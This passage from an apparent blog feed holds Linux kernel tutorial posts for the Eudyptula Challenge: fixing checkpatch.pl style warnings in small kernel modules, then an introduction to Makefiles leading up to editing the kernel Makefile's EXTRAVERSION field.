</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WARNING: It&#39;s generally not useful to have the filename in the file
</span></span><span class="line"><span class="cl">#2: FILE: helloworld.c:2:
</span></span><span class="line"><span class="cl">+* helloworld.c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WARNING: Block comments should align the * on each line
</span></span><span class="line"><span class="cl">#2: FILE: helloworld.c:2:
</span></span><span class="line"><span class="cl">+/*
</span></span><span class="line"><span class="cl">+* helloworld.c
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">total: 0 errors, 3 warnings, 24 lines checked
</span></span></code></pre></div><p>There are 3 warnings reported by this script&hellip;</p>
<ol>
<li>Add SPDX licence info in line 1</li>
<li>Filename at top is not useful</li>
<li>Block comments should have * aligned <em>(This will be discarded because according to point 2, we are going to remove that comment block)</em></li>
</ol>
<p>Now after fixing the code according to the provided suggestions, we get the below code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: GPL-2.0+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">hello_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_debug</span><span class="p">(</span><span class="s">&#34;Hello World!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">hello_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_debug</span><span class="p">(</span><span class="s">&#34;See you later.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">hello_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">hello_exit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;ayedaemon&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Just a module&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>In other module file, we have another code that looks good at first but the <code>checkpatch</code> reults indicate otherwise.</p>
<p>Code:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/delay.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">do_work</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">my_int</span><span class="p">,</span> <span class="kt">int</span> <span class="n">retval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="o">*</span><span class="n">my_int</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">z</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="o">*</span><span class="n">my_int</span><span class="p">;</span> <span class="o">++</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nf">udelay</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * That was a long sleep, tell userspace about it
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="nf">pr_debug</span><span class="p">(</span><span class="s">&#34;We slept a long time!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">z</span> <span class="o">=</span> <span class="n">x</span> <span class="o">*</span> <span class="n">y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">z</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">my_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">x</span> <span class="o">=</span> <span class="nf">do_work</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">my_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">my_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">my_exit</span><span class="p">);</span>
</span></span></code></pre></div><p>This module is somewhat different than what we previously saw. Apart from the regular <code>init</code> and <code>exit</code> functions, this module has an extra function that is called by <code>init</code> function. That&rsquo;s it. You don&rsquo;t have to worry about the code and other logic at this point.. just focus on coding styles.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># COMMAND -  ../linux/scripts/checkpatch.pl -f coding_style.c
</span></span><span class="line"><span class="cl">WARNING: Missing or malformed SPDX-License-Identifier tag in line 1
</span></span><span class="line"><span class="cl">#1: FILE: coding_style.c:1:
</span></span><span class="line"><span class="cl">+#include &lt;linux/module.h&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">WARNING: void function return statements are not generally useful
</span></span><span class="line"><span class="cl">#35: FILE: coding_style.c:35:
</span></span><span class="line"><span class="cl">+	return;
</span></span><span class="line"><span class="cl">+}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">total: 0 errors, 2 warnings, 38 lines checked
</span></span></code></pre></div><p>The script gives us 2 warnings for this module.</p>
<ol>
<li>SPDX licence <em>(just as the previous one, we&rsquo;ll talk more about it later.)</em></li>
<li>void function return statements. <em>(Void functions do not return anything; no return statements are required)</em></li>
</ol>
<p>For this case, I added the SPDX licence comment at line 1 and commented the return statement. If you want, you can remove it entirely from the code. For me, the new code looks like below:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: GPL-2.0+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/delay.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">do_work</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">my_int</span><span class="p">,</span> <span class="kt">int</span> <span class="n">retval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="o">*</span><span class="n">my_int</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">z</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="o">*</span><span class="n">my_int</span><span class="p">;</span> <span class="o">++</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nf">udelay</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">y</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * That was a long sleep, tell userspace about it
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="nf">pr_debug</span><span class="p">(</span><span class="s">&#34;We slept a long time!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">z</span> <span class="o">=</span> <span class="n">x</span> <span class="o">*</span> <span class="n">y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">z</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">my_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">x</span> <span class="o">=</span> <span class="nf">do_work</span><span class="p">(</span><span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">my_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// return;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">my_init</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">my_exit</span><span class="p">);</span>
</span></span></code></pre></div><p>Great!! you are now familiar with the coding style issues in the linux kernel code and has got the ability to fix such issues. If you want to be more automatic with this, you can also use the pre-commit hooks. Read more about git hooks from <a href="https://githooks.com/">githooks.com</a> <sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://www.kernel.org/doc/html/v4.10/process/coding-style.html">https://www.kernel.org/doc/html/v4.10/process/coding-style.html</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://elixir.bootlin.com/linux/latest/source/scripts/checkpatch.pl">https://elixir.bootlin.com/linux/latest/source/scripts/checkpatch.pl</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://www.kernel.org/doc/html/latest/dev-tools/checkpatch.html">https://www.kernel.org/doc/html/latest/dev-tools/checkpatch.html</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p><a href="https://githooks.com/">https://githooks.com/</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Eudyptula Task3</title>
      <link>https://ayedaemon.github.io/post/2022/06/eudyptula-task-3/</link>
      <pubDate>Thu, 16 Jun 2022 16:14:27 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/06/eudyptula-task-3/</guid>
      <description>Task 3 for Eudyptula challenge</description>
      <content:encoded><![CDATA[<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">This is Task 03 of the Eudyptula Challenge
</span></span><span class="line"><span class="cl">------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Now that you have your custom kernel up and running, it&#39;s time to modify
</span></span><span class="line"><span class="cl">it!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The tasks for this round is:
</span></span><span class="line"><span class="cl">  - take the kernel git tree from Task 02 and modify the Makefile to
</span></span><span class="line"><span class="cl">    and modify the EXTRAVERSION field.  Do this in a way that the
</span></span><span class="line"><span class="cl">    running kernel (after modifying the Makefile, rebuilding, and
</span></span><span class="line"><span class="cl">    rebooting) has the characters &#34;-eudyptula&#34; in the version string.
</span></span><span class="line"><span class="cl">  - show proof of booting this kernel.  Extra cookies for you by
</span></span><span class="line"><span class="cl">    providing creative examples, especially if done in intrepretive
</span></span><span class="line"><span class="cl">    dance at your local pub.
</span></span><span class="line"><span class="cl">  - Send a patch that shows the Makefile modified.  Do this in a manner
</span></span><span class="line"><span class="cl">    that would be acceptable for merging in the kernel source tree.
</span></span><span class="line"><span class="cl">    (Hint, read the file Documentation/SubmittingPatches and follow the
</span></span><span class="line"><span class="cl">    steps there.)
</span></span></code></pre></div><p>Linux kernel source code is very huge and compiling such source code files can be tiring, especially when you have to include several source files from different directories and type the compiling command every time you need to compile. <strong><code>Makefiles</code></strong> are the solution to automate and simplify this task.</p>
<h3 id="what-is-a-makefile">What is a Makefile??</h3>
<p>Makefile is a specially formated file which contains all the steps to compile your program in the form of rules. These rules are also sometimes referred as recipes (&hellip;but they both are totally different things🤷‍♂️) and these rules are executed by a utility called <code>make</code>. You might have used <strong>make</strong> to compile a program from source code. Most open source projects use it to compile a final executable binary, which can then be installed typically using <code>make install</code>.</p>
<h4 id="understand-with-examples">Understand with examples</h4>
<p>Let&rsquo;s start with very simple and classic example - &ldquo;Hello World&rdquo;. To begin with, create a new directory called <code>my_make_dir</code> containing a <code>Makefile</code> with below contents in it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="c"># Comment - this says hello
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">say_hello</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">		<span class="nb">echo</span> <span class="s2">&#34;Hello World&#34;</span>
</span></span></code></pre></div><p>If you run <code>make say_hello</code> inside the directory, it&rsquo;ll give below output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">echo &#34;Hello World&#34;
</span></span><span class="line"><span class="cl">Hello World
</span></span></code></pre></div><p>We just created our first Makefile rule and triggered it to run. Here <code>say_hello</code> behaves like a function name, this is also called <strong>target</strong> and <code>echo &quot;Hello World&quot;</code> is a <strong>recipie</strong>.  In a single Makefile there can be multiple targets with multiple sets of recepies.</p>
<p>Let&rsquo;s take a look at another example now,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="c"># Comment - this says hello
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">say_hello</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">		<span class="nb">echo</span> <span class="s2">&#34;Hello World&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">say_bye</span><span class="o">:</span> <span class="n">say_hello</span>
</span></span><span class="line"><span class="cl">		<span class="nb">echo</span> <span class="s2">&#34;I&#39;m going now!&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="nb">echo</span> <span class="s2">&#34;Bye Bye world&#34;</span>
</span></span></code></pre></div><p>In above example, we have 2 targets, namely, <code>say_hello</code> and <code>say_bye</code>.  In the target - <code>say_bye</code>, we have set <code>say_hello</code> as dependency or prerequisite. Pre-requisites are like another targets in the Makefile which should run before the intended target. So when we will invoke <code>say_bye</code> command, it&rsquo;ll first trigger the prerequisite <code>say_hello</code> and then <code>say_bye</code> will be triggered.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># COMMAND -  make say_bye
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">echo &#34;Hello World&#34;
</span></span><span class="line"><span class="cl">Hello World
</span></span><span class="line"><span class="cl">echo &#34;I&#39;m going now!&#34;
</span></span><span class="line"><span class="cl">I&#39;m going now!
</span></span><span class="line"><span class="cl">echo &#34;Bye Bye world&#34;
</span></span><span class="line"><span class="cl">Bye Bye world
</span></span></code></pre></div><p>Another key point about make utility is that whenever it does not take any targets to trigger, it&rsquo;ll trigger the top most target present in the Makefile. In this case, it&rsquo;ll trigger <code>say_hello</code> as it is in the first target in the Makefile.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># COMMAND -  make
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">echo &#34;Hello World&#34;
</span></span><span class="line"><span class="cl">Hello World
</span></span></code></pre></div><h4 id="more-practical-examples">More practical examples</h4>
<p>Now we know some basic terminology around Makefiles and how it works. Let&rsquo;s take a look at some more practical example that can be related to a real-world task.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="nf">all</span><span class="o">:</span> <span class="n">say_hello</span> <span class="n">generate</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">say_hello</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	@echo <span class="s2">&#34;Hello World&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">generate</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	@echo <span class="s2">&#34;Creating empty text files...&#34;</span>
</span></span><span class="line"><span class="cl">	touch file-<span class="o">{</span>1..10<span class="o">}</span>.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	@echo <span class="s2">&#34;Cleaning up...&#34;</span>
</span></span><span class="line"><span class="cl">	rm *.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">say_bye</span><span class="o">:</span> <span class="n">clean</span>
</span></span><span class="line"><span class="cl">	@echo <span class="s2">&#34;Bye World&#34;</span>
</span></span></code></pre></div><p>In above example,  we have got many targets, some with pre-requisites and some without those. Let&rsquo;s pick each one of them and go one by one:</p>
<ol>
<li><code>all</code> : This is the first target in the file and if we do not pass any target to <code>make</code> utility, it&rsquo;ll trigger this target by default. This has got no recipes - just a simple rule without recipes. But this rule has some pre-requisites that will run before anything (in the given order - First <code>say_hello</code> and <code>generate</code>.</li>
<li><code>say_hello</code> : This is another target that can be triggered as a single rule or as a pre-requisite for <code>all</code> target. Anyways, it&rsquo;ll simply print the following string - <code>Hello World</code>.</li>
<li><code>generate</code> : This target is responsible to generate 10 empty files ranging from 1-10. Just like <code>say_hello</code>, it can also be triggered as a single standalone target or as a pre-requisite for <code>all</code> target.</li>
<li><code>Clean</code> : This target cleans all the .txt files from the folder. Idea is to delete all the files created by <code>generate</code> target.</li>
<li><code>say_bye</code> : This target prints &ldquo;Bye World&rdquo;, but has <code>clean</code> target as a pre-requisite so it&rsquo;ll first clean and then it&rsquo;ll run it&rsquo;s own recipes.</li>
</ol>
<p><em>Note:- any line after # (hash) character will be treated as comments by make utility</em></p>
<p>Now we understand what the Makefile consists of, let&rsquo;s see how we are going to use it for our case.</p>
<ol>
<li>To get a &ldquo;Hello World&rdquo; msg and create all the files we can simply type <code>make</code>. This will trigger the first target <code>all</code>, that in turn will execute <code>say_hello</code> and <code>generate</code>.</li>
<li>Once you are done with everything and what to clean-up the mess, you can just type <code>make bye_world</code>. This target will first clean and then provide you with a goodbye message.</li>
</ol>
<p>That&rsquo;s it. Pretty easy, isn&rsquo;t it? Now let&rsquo;s bang our head with another example that is more close to the real world application.</p>
<p>For this, we need to write our program (I&rsquo;ll use C language for that, language is never a barrier for make command). Open up a text editor and write your first <code>HelloWorld.c</code> program.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello World</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The above program will simply print &ldquo;Hello World&rdquo; when compiled and executed. We can write make recipes for this now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="c"># Compile the source code
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">HelloWorld.o</span><span class="o">:</span> <span class="n">HelloWorld</span>.<span class="n">c</span>
</span></span><span class="line"><span class="cl">	gcc  HelloWorld.c   -o HelloWorld.o
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Execute the binary
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">HelloWorld</span><span class="o">:</span> <span class="n">HelloWorld</span>.<span class="n">o</span>
</span></span><span class="line"><span class="cl">	./HelloWorld.o
</span></span></code></pre></div><p>The above <code>Makefile</code> has 2 rules with <code>HelloWorld.o</code> and <code>HelloWorld</code> as targets. Both targets have some recipes and some pre-requisites to it. Remember, the pre-requisite executes first and then the actual recipe for the target&hellip; That&rsquo;s how these rules work.</p>
<p>So if I trigger <code>HelloWorld</code> target, then it&rsquo;ll trigger the <code>HelloWorld.o</code> target as pre-requisite, which will compile the <code>HelloWorld.c</code> source code; Once the <code>HelloWorld.o</code> target is completed, it&rsquo;ll execute the generated <code>./HelloWorld.o</code> binary&hellip; This can be now further reduced to just invoking single <code>make</code> command, by making sure that <code>HelloWorld</code> target runs first by default.</p>
<p>You&rsquo;ll have to change the Makefile to get desired behaviour,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="c"># Creates a variable (this points to the compiler)
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">CC</span><span class="o">=</span>gcc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># First target in the file, default.
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">all</span><span class="o">:</span> <span class="n">HelloWorld</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Executes the source code
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">HelloWorld</span><span class="o">:</span> <span class="n">HelloWorld</span>.<span class="n">o</span>
</span></span><span class="line"><span class="cl">	./HelloWorld.o
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Compile the source code
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">HelloWorld.o</span><span class="o">:</span> <span class="n">HelloWorld</span>.<span class="n">c</span>
</span></span><span class="line"><span class="cl">	<span class="si">${</span><span class="nv">CC</span><span class="si">}</span>  HelloWorld.c   -o HelloWorld.o
</span></span></code></pre></div><p>Above Makefile is now good to compile and run our source code. It has got a variable that stores the compiler name, and it is used in <code>HelloWorld.o</code> target with <code>${CC}</code> syntax. I believe you understand the rest.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/nvkcS2Qc6pvId8S11b/giphy.gif#center" alt=""  />
</p>
<p>Now you can invoke <code>make</code> and it&rsquo;ll compile the source and execute the binary in a single go. One key thing to observe here is, that when we run make multiple times without changing the source code, it is not recompiling the code. This saves us a lot of time. And this is exactly why make is so de-facto automation tool for such usecases. (not &ldquo;de-facto&rdquo;, but you get it, right?)</p>
<p>Now, what about cleaning?? We gotta clean our mess. Although we don&rsquo;t have huge mess, but mess is mess and one gotta take care of his own mess. So we are going to write another rule in our Makefile.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="c"># Deletes the executable binary file
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">clean</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	rm -rf HelloWorld.o
</span></span></code></pre></div><p>Now, anybody who will be using this, just needs to remember 2 commands:-</p>
<ul>
<li><code>make</code> : to actually compile and run the binary file.</li>
<li><code>make clean</code> : To remove the compiled binary file.</li>
</ul>
<h3 id="makefile-for-kernel">Makefile for kernel</h3>
<p>Linux Kernel also uses makefiles (Plural; not singular) to make the building process relatively very easy for anybody. They just have to type 2 commands and a fresh new custom kernel will be ready for them. Although, this might take a lot of time depending upon what hardware you are running on and what files are you gonna compile.</p>
<p>Take a look at the top few lines of the <code>Makefile</code> in the top most directory of source tree.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Makefile" data-lang="Makefile"><span class="line"><span class="cl"><span class="c"># SPDX-License-Identifier: GPL-2.0
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nv">VERSION</span> <span class="o">=</span> <span class="m">5</span>
</span></span><span class="line"><span class="cl"><span class="nv">PATCHLEVEL</span> <span class="o">=</span> <span class="m">19</span>
</span></span><span class="line"><span class="cl"><span class="nv">SUBLEVEL</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">EXTRAVERSION</span> <span class="o">=</span> -ExtraVersionText
</span></span><span class="line"><span class="cl"><span class="nv">NAME</span> <span class="o">=</span> Superb Owl
</span></span></code></pre></div><p>This tells about a lot of things related to version and name given to that version. We can see our <code>EXTRAVERSION</code> which I&rsquo;ve changed in the file (for Task 3 - Eudyptula Challenge).</p>
<p>Reading further down, we have so many sections, separated with comment blocks. These comment blocks are simple and grep-able, give them a try. Once we are comfortable with the idea of Makefiles and linux kernel, we can now connect all the dots and understand how things are linked together.</p>
<ul>
<li>We started with a <code>.config</code> file, that contains all the required kernel configurations. This file is then read by the top-level <code>Makefile</code> in linux kernel directory.</li>
<li>This Makefile is responsible for building 2 major products: <code>vmlinux</code> &amp; <code>modules</code>. To achive this, <strong>make</strong> goes recursively into the sub-directories of kernel source tree and builds and compiles everything. The list of directories is determined using the <code>.config</code> file&hellip;. because that&rsquo;s what we want to compile.</li>
</ul>
